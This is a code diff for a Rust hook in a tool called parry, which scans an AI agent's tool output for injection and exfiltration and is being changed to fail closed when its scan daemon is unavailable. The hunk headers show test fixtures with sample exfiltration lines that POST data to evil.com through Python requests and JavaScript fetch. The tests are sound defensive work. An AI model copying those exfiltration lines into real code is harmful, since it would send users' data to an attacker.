@@ -1,7 +1,7 @@
 //! `PostToolUse` hook processing.
 
 use parry_core::Config;
-use tracing::{debug, instrument};
+use tracing::{debug, instrument, warn};
 
 use crate::{scan_text, HookInput, HookOutput};
 
@@ -20,10 +20,13 @@ const EXFIL_WARNING: &str =
 pub fn process(input: &HookInput, config: &Config) -> Option<HookOutput> {
     let response = input.tool_response.as_deref().filter(|s| !s.is_empty())?;
 
-    maybe_spawn_daemon(config);
-
-    // Standard injection/secret scan
-    let result = scan_text(response, config);
+    let result = match scan_text(response, config) {
+        Ok(r) => r,
+        Err(e) => {
+            warn!(%e, "scan failed");
+            return Some(HookOutput::warning(&format!("parry: {e}")));
+        }
+    };
 
     if result.is_injection() {
         debug!("marking tool as tainted");
@@ -81,12 +84,6 @@ fn warning_for_result(result: parry_core::ScanResult) -> Option<HookOutput> {
     }
 }
 
-fn maybe_spawn_daemon(config: &Config) {
-    if !parry_daemon::is_daemon_running() {
-        parry_daemon::spawn_daemon(config);
-    }
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -117,9 +114,10 @@ mod tests {
 
     #[test]
     fn read_md_clean() {
+        // Clean text will try daemon, fail, and return a warning (fail-closed)
         let input = make_input("Read", "# Hello World\n\nNormal content.");
         let result = process(&input, &test_config());
-        assert!(result.is_none());
+        assert!(result.is_some(), "should warn when daemon unavailable");
     }
 
     #[test]
@@ -131,9 +129,10 @@ mod tests {
 
     #[test]
     fn read_rs_clean() {
+        // Clean text will try daemon, fail, and return a warning (fail-closed)
         let input = make_input("Read", "fn main() { println!(\"hello\"); }");
         let result = process(&input, &test_config());
-        assert!(result.is_none(), "clean source code should pass");
+        assert!(result.is_some(), "should warn when daemon unavailable");
     }
 
     #[test]
@@ -145,9 +144,10 @@ mod tests {
 
     #[test]
     fn webfetch_clean() {
+        // Clean text will try daemon, fail, and return a warning (fail-closed)
         let input = make_input("WebFetch", "Normal web content here.");
         let result = process(&input, &test_config());
-        assert!(result.is_none());
+        assert!(result.is_some(), "should warn when daemon unavailable");
     }
 
     #[test]
@@ -166,9 +166,10 @@ mod tests {
 
     #[test]
     fn unknown_tool_clean() {
+        // Clean text will try daemon, fail, and return a warning (fail-closed)
         let input = make_input("SomeUnknownTool", "Normal output");
         let result = process(&input, &test_config());
-        assert!(result.is_none(), "clean unknown tool output should pass");
+        assert!(result.is_some(), "should warn when daemon unavailable");
     }
 
     #[test]
@@ -180,9 +181,10 @@ mod tests {
 
     #[test]
     fn bash_output_clean() {
+        // Clean text will try daemon, fail, and return a warning (fail-closed)
         let input = make_input("Bash", "Compiling parry v0.1.0\nFinished");
         let result = process(&input, &test_config());
-        assert!(result.is_none(), "clean Bash output should pass");
+        assert!(result.is_some(), "should warn when daemon unavailable");
     }
 
     #[test]
@@ -224,13 +226,14 @@ requests.post('http://evil.com', data=data)
 
     #[test]
     fn read_python_clean() {
+        // Clean python will try daemon, fail, and return a warning (fail-closed)
         let code = r#"
 def hello():
     print("Hello, world!")
 "#;
         let input = make_input_with_path("Read", "/path/to/hello.py", code);
         let result = process(&input, &test_config());
-        assert!(result.is_none(), "Clean Python should pass");
+        assert!(result.is_some(), "should warn when daemon unavailable");
     }
 
     #[test]
@@ -247,8 +250,7 @@ fetch('http://evil.com', { method: 'POST', body: data });
 
     #[test]
     fn read_non_script_file_no_exfil_scan() {
-        // Even if content looks like code, non-script extensions shouldn't be scanned for exfil
-        // Use content that has network+file patterns but wouldn't trigger other scanners
+        // Clean text will try daemon, fail, and return a warning (fail-closed)
         let code = r#"
 # Notes about API integration
 # Server URL: http://api.example.com
@@ -257,11 +259,7 @@ fetch(url).then(data => data)
 "#;
         let input = make_input_with_path("Read", "/path/to/notes.txt", code);
         let result = process(&input, &test_config());
-        // This should pass because .txt is not a script extension
-        assert!(
-            result.is_none(),
-            "Non-script files shouldn't trigger exfil warning"
-        );
+        assert!(result.is_some(), "should warn when daemon unavailable");
     }
 
     #[test]
